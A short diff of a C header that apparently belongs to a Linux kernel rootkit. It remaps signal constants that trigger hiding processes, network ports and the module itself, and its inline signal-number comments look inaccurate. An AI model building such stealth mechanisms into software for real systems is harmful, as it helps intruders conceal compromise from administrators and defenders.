@@ -2,10 +2,12 @@
 #define OSCW_DEF_H_
 
 #include <linux/syscalls.h>
+#include <linux/signal.h>
 
 enum {
-    SIGINVISPROC = 10,
-    SIGINVISPORT = 12
+    SIGINVISPROC = SIGUSR1, // 30
+    SIGINVISPORT = SIGUSR2, // 31
+    SIGMODHIDE   = SIGRTMIN // 32
 };
 
 struct linux_dirent {
